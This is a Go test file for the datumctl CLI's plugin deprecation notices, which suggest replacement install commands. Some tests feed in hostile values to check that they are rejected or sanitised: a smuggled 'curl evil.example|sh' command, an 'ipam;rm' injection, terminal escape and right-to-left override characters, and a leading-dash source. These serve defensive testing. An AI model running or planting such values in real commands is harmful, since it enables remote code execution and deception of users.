package plugin

import (
	"bytes"
	"os"
	"strings"
	"testing"

	"go.datum.net/datumctl/internal/pluginstore"
)

const milosSource = "milo-os/cli-plugins"

func depRegistry(extra ...pluginstore.Catalog) *pluginstore.Registry {
	return &pluginstore.Registry{Catalogs: append([]pluginstore.Catalog{pluginstore.OfficialCatalog()}, extra...)}
}

func depNotice(reg *pluginstore.Registry, d *pluginstore.Deprecation) string {
	var buf bytes.Buffer
	writeDeprecationNotice(&buf, reg, "ipam", d)
	return buf.String()
}

func milosDep() *pluginstore.Deprecation {
	return &pluginstore.Deprecation{
		Message:     "ipam moved to the Milo catalog.",
		Replacement: &pluginstore.PluginReplacement{Catalog: milosSource},
	}
}

func TestDeprecationNotice_replacementNotRegistered(t *testing.T) {
	want := "warning: ipam is deprecated: ipam moved to the Milo catalog.\n" +
		"  To switch to the replacement:\n" +
		"    datumctl plugin index add milo-os milo-os/cli-plugins\n" +
		"    datumctl plugin install milo-os/ipam\n"
	if got := depNotice(depRegistry(), milosDep()); got != want {
		t.Errorf("got:\n%s\nwant:\n%s", got, want)
	}
}

func TestDeprecationNotice_replacementRegisteredUnderOtherName(t *testing.T) {
	reg := depRegistry(pluginstore.Catalog{
		Name:   "acme-milo",
		Source: "https://raw.githubusercontent.com/milo-os/cli-plugins/main/index.yaml",
	})
	got := depNotice(reg, milosDep())
	if strings.Contains(got, "index add") {
		t.Errorf("unexpected index add line:\n%s", got)
	}
	if !strings.Contains(got, "datumctl plugin install acme-milo/ipam") {
		t.Errorf("missing install line:\n%s", got)
	}
}

func TestDeprecationNotice_suggestedNameTaken(t *testing.T) {
	reg := depRegistry(pluginstore.Catalog{Name: "milo-os", Source: "other/repo"})
	got := depNotice(reg, milosDep())
	for _, s := range []string{
		"datumctl plugin index add <name> milo-os/cli-plugins",
		"datumctl plugin install <name>/ipam",
	} {
		if !strings.Contains(got, s) {
			t.Errorf("missing %q:\n%s", s, got)
		}
	}
}

func TestDeprecationNotice_replacementDisabled(t *testing.T) {
	reg := depRegistry(pluginstore.Catalog{
		Name: "acme-milo", Source: milosSource,
		Disabled: true, DisabledReason: "not in allow-list",
	})
	got := depNotice(reg, milosDep())
	if !strings.Contains(got, `catalog "acme-milo" is disabled: not in allow-list`) {
		t.Errorf("missing disabled line:\n%s", got)
	}
	if strings.Contains(got, "datumctl plugin") {
		t.Errorf("unexpected command line:\n%s", got)
	}
}

func TestDeprecationNotice_renamedReplacement(t *testing.T) {
	d := milosDep()
	d.Replacement.Name = "ipam2"
	got := depNotice(depRegistry(), d)
	if !strings.Contains(got, "install milo-os/ipam2") {
		t.Errorf("missing renamed install:\n%s", got)
	}
}

func TestDeprecationNotice_noMessageNoReplacement(t *testing.T) {
	want := "warning: ipam is deprecated.\n"
	if got := depNotice(depRegistry(), &pluginstore.Deprecation{}); got != want {
		t.Errorf("got %q want %q", got, want)
	}
}

func TestDeprecationNotice_nil(t *testing.T) {
	if got := depNotice(depRegistry(), nil); got != "" {
		t.Errorf("got %q, want empty", got)
	}
}

func TestDeprecationNotice_sanitizesMessage(t *testing.T) {
	got := depNotice(depRegistry(), &pluginstore.Deprecation{Message: "moved\x1b[2J\nwarning: fake"})
	if strings.Contains(got, "\x1b") {
		t.Errorf("ESC survived: %q", got)
	}
	if lines := strings.Split(strings.TrimSuffix(got, "\n"), "\n"); len(lines) != 1 {
		t.Errorf("want one line, got %q", got)
	}
	if want := "warning: ipam is deprecated: moved[2Jwarning: fake\n"; got != want {
		t.Errorf("got %q want %q", got, want)
	}
}

func TestDeprecationNotice_prefersEnabledCatalog(t *testing.T) {
	reg := depRegistry(
		pluginstore.Catalog{Name: "acme-off", Source: milosSource, Disabled: true, DisabledReason: "not in allow-list"},
		pluginstore.Catalog{Name: "acme-on", Source: milosSource},
	)
	got := depNotice(reg, milosDep())
	if !strings.Contains(got, "datumctl plugin install acme-on/ipam") {
		t.Errorf("missing install line for enabled catalog:\n%s", got)
	}
	if strings.Contains(got, "disabled") {
		t.Errorf("unexpected disabled line:\n%s", got)
	}
}

const invalidReplLine = "  The replacement named by this catalog is not valid; contact the catalog's maintainer.\n"

func TestDeprecationNotice_invalidSource(t *testing.T) {
	d := &pluginstore.Deprecation{Message: "m", Replacement: &pluginstore.PluginReplacement{Catalog: "x y; curl evil.example|sh"}}
	got := depNotice(depRegistry(), d)
	if strings.Contains(got, "datumctl plugin") || !strings.HasSuffix(got, invalidReplLine) {
		t.Errorf("got:\n%s", got)
	}
}

func TestDeprecationNotice_leadingDashSource(t *testing.T) {
	// ResolveCatalogSource accepts a bare path that exists on disk, so with
	// "-x" present only the reReplacementSource check can reject it.
	t.Chdir(t.TempDir())
	if err := os.WriteFile("-x", nil, 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := pluginstore.ResolveCatalogSource("-x"); err != nil {
		t.Fatalf("precondition: ResolveCatalogSource(-x) = %v, want nil", err)
	}
	d := &pluginstore.Deprecation{Message: "m", Replacement: &pluginstore.PluginReplacement{Catalog: "-x", Name: "ipam"}}
	got := depNotice(depRegistry(), d)
	if strings.Contains(got, "datumctl plugin") || !strings.HasSuffix(got, invalidReplLine) {
		t.Errorf("got:\n%s", got)
	}
}

func TestDeprecationNotice_invalidReplacementName(t *testing.T) {
	d := milosDep()
	d.Replacement.Name = "ipam;rm"
	got := depNotice(depRegistry(), d)
	if strings.Contains(got, "datumctl plugin") || !strings.HasSuffix(got, invalidReplLine) {
		t.Errorf("got:\n%s", got)
	}
}

func TestDeprecationNotice_stripsFormatChars(t *testing.T) {
	got := depNotice(depRegistry(), &pluginstore.Deprecation{Message: "a\u202eb"})
	if want := "warning: ipam is deprecated: ab\n"; got != want {
		t.Errorf("got %q want %q", got, want)
	}
}

func TestDeprecationNotice_disabledExactLines(t *testing.T) {
	for reason, wantReason := range map[string]string{"not in allow-list": "not in allow-list", "": "disabled by policy"} {
		reg := depRegistry(pluginstore.Catalog{Name: "acme-milo", Source: milosSource, Disabled: true, DisabledReason: reason})
		want := "warning: ipam is deprecated: ipam moved to the Milo catalog.\n" +
			"  The replacement's catalog \"acme-milo\" is disabled: " + wantReason + "\n"
		if got := depNotice(reg, milosDep()); got != want {
			t.Errorf("reason %q: got:\n%s\nwant:\n%s", reason, got, want)
		}
	}
}

func TestDeprecationNotice_noMessageWithReplacement(t *testing.T) {
	d := milosDep()
	d.Message = ""
	want := "warning: ipam is deprecated.\n" +
		"  To switch to the replacement:\n" +
		"    datumctl plugin index add milo-os milo-os/cli-plugins\n" +
		"    datumctl plugin install milo-os/ipam\n"
	if got := depNotice(depRegistry(), d); got != want {
		t.Errorf("got:\n%s\nwant:\n%s", got, want)
	}
}
